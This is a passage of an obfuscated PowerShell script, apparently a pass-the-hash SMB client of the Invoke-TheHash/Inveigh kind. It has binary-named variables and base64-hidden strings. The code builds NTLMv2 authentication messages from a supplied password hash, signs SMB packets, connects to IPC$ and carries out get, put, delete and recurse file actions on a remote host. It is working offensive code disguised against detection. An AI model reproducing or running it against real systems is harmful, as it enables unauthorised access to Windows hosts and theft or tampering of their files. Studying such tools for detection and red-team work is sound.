            ${11000011001010001} = ${01010011010010111} / 2
            ${00001010010010000} = _10101100111001000 (${11000011001010001} + 12) ${00011101010001010}
            ${00000001011000011} = _10101100111001000 (${11000011001010001} + 40) ${00011101010001010}
            ${01101000011110110} = ${00011101010001010}[44..51]
            ${00001110101010101} = ${00011101010001010}[(${11000011001010001} + 24)..(${11000011001010001} + 31)]
            ${00100111100100000} = ${00011101010001010}[(${11000011001010001} + 56 + ${00001010010010000})..(${11000011001010001} + 55 + ${00001010010010000} + ${00000001011000011})]
            ${01010100101100010} = ${00100111100100000}[(${00100111100100000}.Length - 12)..(${00100111100100000}.Length - 5)]
            ${01110101110000101} = (&{for (${10101111111010000} = 0;${10101111111010000} -lt $hash.Length;${10101111111010000} += 2){$hash.SubString(${10101111111010000},2)}}) -join "-"
            ${01110101110000101} = ${01110101110000101}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${00100101001100010} = (ls -path env:computername).Value
            ${00011001000110111} = [System.Text.Encoding]::Unicode.GetBytes(${00100101001100010})
            ${10001111111101011} = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            ${01100100010010101} = [System.Text.Encoding]::Unicode.GetBytes($username)
            ${10000011000101001} = [System.BitConverter]::GetBytes(${10001111111101011}.Length)[0,1]
            ${10000011000101001} = [System.BitConverter]::GetBytes(${10001111111101011}.Length)[0,1]
            ${00101000110000001} = [System.BitConverter]::GetBytes(${01100100010010101}.Length)[0,1]
            ${10011111111000010} = [System.BitConverter]::GetBytes(${00011001000110111}.Length)[0,1]
            ${00010011010111110} = 0x40,0x00,0x00,0x00
            ${01011110010001100} = [System.BitConverter]::GetBytes(${10001111111101011}.Length + 64)
            ${00000101001111011} = [System.BitConverter]::GetBytes(${10001111111101011}.Length + ${01100100010010101}.Length + 64)
            ${00011001010011000} = [System.BitConverter]::GetBytes(${10001111111101011}.Length + ${01100100010010101}.Length + ${00011001000110111}.Length + 64)
            ${10001001110000000} = [System.BitConverter]::GetBytes(${10001111111101011}.Length + ${01100100010010101}.Length + ${00011001000110111}.Length + 88)
            ${01010011101100100} = New-Object System.Security.Cryptography.HMACMD5
            ${01010011101100100}.key = ${01110101110000101}
            ${10011011000111100} = $username.ToUpper()
            ${00110100011000101} = [System.Text.Encoding]::Unicode.GetBytes(${10011011000111100})
            ${00110100011000101} += ${10001111111101011}
            ${00111101010010110} = ${01010011101100100}.ComputeHash(${00110100011000101})
            ${01001010100011000} = [String](1..8 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
            ${11000011000101001} = ${01001010100011000}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
            ${00001010110101000} = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    ${01010100101100010} +
                                    ${11000011000101001} +
                                    0x00,0x00,0x00,0x00 +
                                    ${00100111100100000} +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00
            ${01111110110101011} = ${00001110101010101} + ${00001010110101000}
            ${01010011101100100}.key = ${00111101010010110}
            ${01001110101001001} = ${01010011101100100}.ComputeHash(${01111110110101011})
            if(${00011001101011011})
            {
                ${01101110101011000} = ${01010011101100100}.ComputeHash(${01001110101001001})
                ${00100111010101100} = ${01101110101011000}
                ${00110010110100010} = New-Object System.Security.Cryptography.HMACSHA256
                ${00110010110100010}.key = ${00100111010101100}
            }
            ${01001110101001001} = ${01001110101001001} + ${00001010110101000}
            ${00111101100110000} = [System.BitConverter]::GetBytes(${01001110101001001}.Length)[0,1]
            ${10100001111011000} = [System.BitConverter]::GetBytes(${10001111111101011}.Length + ${01100100010010101}.Length + ${00011001000110111}.Length + ${01001110101001001}.Length + 88)
            ${00011000000110000} = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    ${00011001010011000} +
                                    ${00111101100110000} +
                                    ${00111101100110000} +
                                    ${10001001110000000} +
                                    ${10000011000101001} +
                                    ${10000011000101001} +
                                    ${00010011010111110} +
                                    ${00101000110000001} +
                                    ${00101000110000001} +
                                    ${01011110010001100} +
                                    ${10011111111000010} +
                                    ${10011111111000010} +
                                    ${00000101001111011} +
                                    ${00111010011101010} +
                                    ${00111010011101010} +
                                    ${10100001111011000} +
                                    ${00001101110101000} +
                                    ${10001111111101011} +
                                    ${01100100010010101} +
                                    ${00011001000110111} +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    ${01001110101001001}
            if(${10100011001111100} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
            {
                ${00100011000000001} = ${00011101010001010}[32,33]
                ${01001001111100000} = _10001001110101001 0x73 0x18 0x07,0xc8 0xff,0xff ${00101101111101100} ${00100011000000001}
                if(${00011001101011011})
                {
                    ${01001001111100000}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                }
                ${01001001111100000}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAEQA')))] = ${00100011000000001}
                ${00111011101110110} = _10010110011000110 ${00011000000110000}
                ${10111100101110101} = _00001101111001010 ${01001001111100000}
                ${00011111110010010} = _00001101111001010 ${00111011101110110}      
                ${10100000100111101} = _01101101000011000 ${00011111110010010}
                ${10011100001010100} = _00001101111001010 ${10100000100111101}
                ${10001001100110010} = _01001110110110100 ${10111100101110101}.Length ${10011100001010100}.Length
                ${00111100000001110} = _00001101111001010 ${10001001100110010}
                ${10111000101110001} = ${00111100000001110} + ${10111100101110101} + ${10011100001010100}
            }
            else
            {
                ${01101111101011000}++
                ${01001001111100000} = _01000000100101100 0x01,0x00 0x00,0x00 $false ${01101111101011000}  ${00101101111101100} ${10000111101100010} ${01101000011110110}
                ${00001110011001010} = _10010110011000110 ${00011000000110000}
                ${10111100101110101} = _00001101111001010 ${01001001111100000}
                ${00000101001100010} = _00001101111001010 ${00001110011001010}        
                ${10100000100111101} = _01110111011011000 ${00000101001100010}
                ${10011100001010100} = _00001101111001010 ${10100000100111101}
                ${10001001100110010} = _01001110110110100 ${10111100101110101}.Length ${10011100001010100}.Length
                ${00111100000001110} = _00001101111001010 ${10001001100110010}
                ${10111000101110001} = ${00111100000001110} + ${10111100101110101} + ${10011100001010100}
            }
            try
            {
                ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                ${01001101101100010}.Flush()
                ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                if(${10100011001111100} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
                {
                    if([System.BitConverter]::ToString(${00011101010001010}[9..12]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                    {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAAkAHsAMAAwADEAMAAwADEAMQAwADEAMAAwADEAMAAwADEAMQAwAH0AIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAGQAIABvAG4AIAAkAHsAMQAwADAAMQAxADAAMAAwADEAMQAwADAAMAAwADEAMAAwAH0A')))
                        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAE0AQgAxACAAaQBzACAAbwBuAGwAeQAgAHMAdQBwAHAAbwByAHQAZQBkACAAdwBpAHQAaAAgAHMAaQBnAG4AaQBuAGcAIABjAGgAZQBjAGsAIABhAG4AZAAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABpAG8AbgA=')))
                        ${01011111110101010} = $false
                    }
                    else
                    {
                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIAAkAHsAMAAwADEAMAAwADEAMQAwADEAMAAwADEAMAAwADEAMQAwAH0AIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAbwBuACAAJAB7ADEAMAAwADEAMQAwADAAMAAxADEAMAAwADAAMAAxADAAMAB9AA==')))
                        ${01011111110101010} = $false
                    }
                }
                else
                {
                    if([System.BitConverter]::ToString(${00011101010001010}[12..15]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                    {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAAkAHsAMAAwADEAMAAwADEAMQAwADEAMAAwADEAMAAwADEAMQAwAH0AIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlAGQAIABvAG4AIAAkAHsAMQAwADAAMQAxADAAMAAwADEAMQAwADAAMAAwADEAMAAwAH0A')))
                        ${01011111110101010} = $true
                    }
                    else
                    {
                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIAAkAHsAMAAwADEAMAAwADEAMQAwADEAMAAwADEAMAAwADEAMQAwAH0AIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAdQB0AGgAZQBuAHQAaQBjAGEAdABlACAAbwBuACAAJAB7ADEAMAAwADEAMQAwADAAMAAxADEAMAAwADAAMAAxADAAMAB9AA==')))
                        ${01011111110101010} = $false
                    }
                }
            }
            catch
            {
                echo "[-] $($_.Exception.Message)"
                ${01011111110101010} = $false
            }
        }
    }
    try
    {
        if(${01011111110101010} -or ${00010111101111000})
        {
            if(${00010111101111000})
            {
                if(${00010111101111000} -and $inveigh.session_lock_table[$session] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBlAGQA'))))
                {
                    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABQAGEAdQBzAGkAbgBnACAAZAB1AGUAIAB0AG8AIABJAG4AdgBlAGkAZwBoACAAUgBlAGwAYQB5ACAAcwBlAHMAcwBpAG8AbgAgAGwAbwBjAGsA')))
                    sleep -s 2
                }
                $inveigh.session_lock_table[$session] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAawBlAGQA')))
                ${01000100110110000} = $inveigh.session_socket_table[$session]
                ${01001101101100010} = ${01000100110110000}.GetStream()
                ${01101000011110110} = $inveigh.session_table[$session]
                ${01101111101011000} =  $inveigh.session_message_ID_table[$session]
                ${10000111101100010} = 0x00,0x00,0x00,0x00
                ${00011001101011011} = $false
            }
            ${10111011000010110} = "\\" + ${10011000110000100} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAFAAQwAkAA==')))
            ${00111011010000000} = [System.Text.Encoding]::Unicode.GetBytes(${10111011000010110})
            ${10011111011100111} = New-Object System.Collections.ArrayList
            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
            while (${10000110001100100} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
            {
                switch(${10000110001100100})
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    {
                        if(!${01111100001000010})
                        {
                            ${01111100001000010} = ${00011101010001010}[132..147]
                        }
                        ${01101111101011000}++
                        ${00011000000011011} = _01000000100101100 0x06,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${01010110011011101} = _00110110001001001 ${01111100001000010}
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101}
                        ${10001001100110010} = _01001110110110100 ${01101111100110010}.Length ${00111011000011000}.Length
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${01101111100110010} + ${00111011000011000}
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        }
                        ${10111000101110001} = ${00111100000001110} + ${01101111100110010} + ${00111011000011000}
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        ${01111100001000010} = ''
                        if(${10011111011100111}.Count -gt 0 -and $Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQA='))))
                        {
                            ${00000100001111000} = ${10011111011100111}[0]
                            ${01100011001101111} = ${00000100001111000} + 0x5c,0x00
                            ${11000000100110110} = 1
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                            if(${01100011001101111}.Count -gt 2)
                            {
                                ${01101101000111100} = [System.BitConverter]::ToString(${01100011001101111})
                                ${01101101000111100} = ${01101101000111100} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                                if(${01100011001101111}.Length -gt 2)
                                {
                                    ${01101101000111100} = ${01101101000111100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                                    ${10111010001111101} = New-Object System.String (${01101101000111100},0,${01101101000111100}.Length)
                                }
                                else
                                {
                                    ${10111010001111101} = [Char][System.Convert]::ToInt16(${00000100001111000},16)
                                }
                            }
                        }
                        elseif($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) -and ${01010110011000111} -eq 1)
                        {
                            if(${10000110000000001} -eq ${00010110100000001})
                            {
                                ${00000100001111000} = ""
                            }
                            else
                            {
                                ${00000100001111000} = [System.Text.Encoding]::Unicode.GetBytes(${10000110000000001}.Replace('\' + ${00010110100000001},''))
                            }
                            ${11000000100110110} = 1
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                        }
                        elseif($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA'))))
                        {
                            switch(${01010110011000111})
                            {
                                0
                                {
                                    if(${10000110000000001} -eq ${00010110100000001})
                                    {
                                        ${00000100001111000} = ""
                                    }
                                    else
                                    {
                                        ${00000100001111000} = [System.Text.Encoding]::Unicode.GetBytes(${10000110000000001}.Replace('\' + ${00010110100000001},''))
                                    }
                                    ${11000000100110110} = 1
                                    ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                                    ${01010110011000111}++
                                }
                                1
                                {
                                    ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdABGAGkAbgBkAFIAZQBxAHUAZQBzAHQA')))
                                }
                                3
                                {
                                    ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                }
                            }
                        }
                        elseif(${00011110100011000})
                        {
                            ${00011110100011000} = $false
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdABGAGkAbgBkAFIAZQBxAHUAZQBzAHQA')))
                        }
                        else
                        {
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                    {
                        ${01101111101011000}++
                        ${00011000000011011} = _01000000100101100 0x05,0x00 0x01,0x00 ${00011001101011011} ${01101111101011000} ${00101101111101100} ${10000111101100010} ${01101000011110110}
                        ${01010110011011101} = _00011110111010101 ${00000100001111000} ${11000000100110110} ${01011001110100010}
                        if(${10011111011100111}.Count -gt 0)
                        {
                            ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAaQByAGUAZABBAGMAYwBlAHMAcwA=')))] = 0x81,0x00,0x10,0x00
                            ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAEEAYwBjAGUAcwBzAA==')))] = 0x07,0x00,0x00,0x00
                        }
                        if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA'))))
                        {
                            switch(${01010110011000111})
                            {
                                0
                                {
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUATwBwAHQAaQBvAG4AcwA=')))] = 0x00,0x00,0x20,0x00
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAaQByAGUAZABBAGMAYwBlAHMAcwA=')))] = 0x80,0x00,0x00,0x00
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAEEAYwBjAGUAcwBzAA==')))] = 0x07,0x00,0x00,0x00
                                }
                                2
                                {
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUATwBwAHQAaQBvAG4AcwA=')))] = 0x40,0x00,0x20,0x00
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAaQByAGUAZABBAGMAYwBlAHMAcwA=')))] = 0x80,0x00,0x01,0x00
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAEEAYwBjAGUAcwBzAA==')))] = 0x07,0x00,0x00,0x00
                                }
                            }
                        }
                        if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))))
                        {
                            ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUATwBwAHQAaQBvAG4AcwA=')))] = 0x00,0x00,0x20,0x00
                            ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAaQByAGUAZABBAGMAYwBlAHMAcwA=')))] = 0x89,0x00,0x12,0x00
                            ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAEEAYwBjAGUAcwBzAA==')))] = 0x05,0x00,0x00,0x00
                        }
                        if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))))
                        {
                            switch(${01010110011000111})
                            {
                                0
                                {
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUATwBwAHQAaQBvAG4AcwA=')))] = 0x60,0x00,0x20,0x00
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAaQByAGUAZABBAGMAYwBlAHMAcwA=')))] = 0x89,0x00,0x12,0x00
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAEEAYwBjAGUAcwBzAA==')))] = 0x01,0x00,0x00,0x00
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQATwBwAGwAbwBjAGsATABlAHYAZQBsAA==')))] = 0xff
                                }
                                1
                                {
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUATwBwAHQAaQBvAG4AcwA=')))] = 0x64,0x00,0x00,0x00
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAaQByAGUAZABBAGMAYwBlAHMAcwA=')))] = 0x97,0x01,0x13,0x00
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAEEAYwBjAGUAcwBzAA==')))] = 0x00,0x00,0x00,0x00
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQATwBwAGwAbwBjAGsATABlAHYAZQBsAA==')))] = 0xff
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAHQAdAByAGkAYgB1AHQAZQBzAA==')))] = 0x20,0x00,0x00,0x00
                                    ${01010110011011101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUARABpAHMAcABvAHMAaQB0AGkAbwBuAA==')))] = 0x05,0x00,0x00,0x00
                                }
                            }
                        }
                        ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        ${00111011000011000} = _00001101111001010 ${01010110011011101}  
                        ${10001001100110010} = _01001110110110100 ${01101111100110010}.Length ${00111011000011000}.Length
                        ${00111100000001110} = _00001101111001010 ${10001001100110010}
                        if(${00011001101011011})
                        {
                            ${10100010101000001} = ${01101111100110010} + ${00111011000011000}  
                            ${01111110100111010} = ${00110010110100010}.ComputeHash(${10100010101000001})
                            ${01111110100111010} = ${01111110100111010}[0..15]
                            ${00011000000011011}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111110100111010}
                            ${01101111100110010} = _00001101111001010 ${00011000000011011}
                        }
                        ${10111000101110001} = ${00111100000001110} + ${01101111100110010} + ${00111011000011000}
                        ${01001101101100010}.Write(${10111000101110001},0,${10111000101110001}.Length) > $null
                        ${01001101101100010}.Flush()
                        ${01001101101100010}.Read(${00011101010001010},0,${00011101010001010}.Length) > $null
                        if([System.BitConverter]::ToString(${00011101010001010}[12..15]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                        {
                            ${01011000010100000} = [System.BitConverter]::ToString(${00011101010001010}[15..12])
                            switch(${01011000010100000})
                            {
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAwAC0AMAAwAC0AMAAxAC0AMAAzAA==')))
                                {
                                    ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAwAC0AMAAwAC0AMAAwAC0AMgAyAA==')))
                                {
                                    if(${10011111011100111}.Count -gt 0)
                                    {
                                        ${10011111011100111}.RemoveAt(0) > $null
                                    }
                                    else
                                    {
                                        ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABBAGMAYwBlAHMAcwAgAGQAZQBuAGkAZQBkAA==')))
                                        ${00011110100011000} = $false
                                    }
                                    ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAwAC0AMAAwAC0AMAAwAC0AMwA0AA==')))
                                {
                                    if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))))
                                    {
                                        ${11000000100110110} = 3
                                        ${01010110011000111}++
                                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                                    }
                                    else
                                    {
                                        ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABGAGkAbABlACAAbgBvAHQAIABmAG8AdQBuAGQA')))
                                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAwAC0AMAAwAC0AMAAwAC0AYgBhAA==')))
                                {
                                    if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))))
                                    {
                                        ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABEAGUAcwB0AGkAbgBhAHQAaQBvAG4AIABmAGkAbABuAGEAbQBlACAAbQB1AHMAdAAgAGIAZQAgAHMAcABlAGMAaQBmAGkAZQBkAA==')))
                                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                    }
                                }
                                default
                                {
                                    ${01011000010100000} = ${01011000010100000} -replace "-",""
                                    ${01100110111011000} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABDAHIAZQBhAHQAZQAgAHIAZQBxAHUAZQBzAHQAIABlAHIAcgBvAHIAIABjAG8AZABlACAAMAB4ACQAewAwADEAMAAxADEAMAAwADAAMAAxADAAMQAwADAAMAAwADAAfQA=')))
                                    ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                }
                            }
                        }
                        elseif($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA'))) -and ${01010110011000111} -eq 2)
                        {
                            ${01111110110011010} = 0x01
                            ${10111101101100010} = 0x0d
                            ${10110101001100110} = 0x01,0x00,0x00,0x00
                            ${01111100001000010} = ${00011101010001010}[132..147]
                            ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQASQBuAGYAbwBSAGUAcQB1AGUAcwB0AA==')))
                        }
                        elseif($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) -and ${01010110011000111} -ne 1)
                        {
                            switch(${01010110011000111})
                            {
                                0
                                {
                                    ${01111100001000010} = ${00011101010001010}[132..147]
                                    ${01010110011000111}++
                                    ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                }
                                2
                                {
                                    if(${01111100101011001} -lt 4096)
                                    {
                                        ${01101110101111000} = ${01111100101011001}
                                    }
                                    else
                                    {
                                        ${01101110101111000} = 4096
                                    }
                                    ${00000110000111100} = 0
                                    ${01111100001000010} = ${00011101010001010}[132..147]
                                    ${01010110011000111}++
                                    ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                                }
                                4
                                {
                                    ${01101110101010111} = 0x68,0x00,0x00,0x00
                                    ${10100110010111111} = 0x01
                                    ${00000110110010011} = 0x07
                                    ${10000100010001101} = 0x00,0x10,0x00,0x00
                                    ${10110110111101000} = 0x68,0x00
                                    ${01100011101101010} = 0
                                    ${01100110011000011} = 0x01
                                    ${00111110000111110} = 0x16
                                    ${10000011101011001} = 0x00,0x10,0x00,0x00
                                    ${10000011000110000} = 0x68,0x00
                                    ${10011000110010111} = 0
                                    ${01111100001000010} = ${00011101010001010}[132..147]
                                    ${01010110011000111}++
                                    ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEkAbgBmAG8AUgBlAHEAdQBlAHMAdAA=')))
                                }
                            }
                        }
                        elseif($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))))
                        {
                            switch(${01010110011000111})
                            {
                                0
                                {
                                    if($Action -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AHQA'))))
                                    {
                                        ${01100110111011000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAdABpAG4AYQB0AGkAbwBuACAAZgBpAGwAZQAgAGUAeABpAHMAdABzAA==')))
                                        ${10000110001100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                    }
                                }
                                1
                                {
                                    ${01111100001000010} = ${00011101010001010}[132..147]
                                    ${01010110011000111}++
                                    ${01101110101010111} = 0x70,0x00,0x00,0x00
                                    ${10100110010111111} = 0x02
                                    ${00000110110010011} = 0x01
                                    ${10000100010001101} = 0x58,0x00,0x00,0x00
                                    ${10110110111101000} = 0x00,0x00
                                    ${01100011101101010} = 8
                                    ${01100110011000011} = 0x02
                                    ${00111110000111110} = 0x05
                                    ${10000011101011001} = 0x50,0x00,0x00,0x00
                                    ${10000011000110000} = 0x00,0x00
                                    ${10011000110010111} = 1
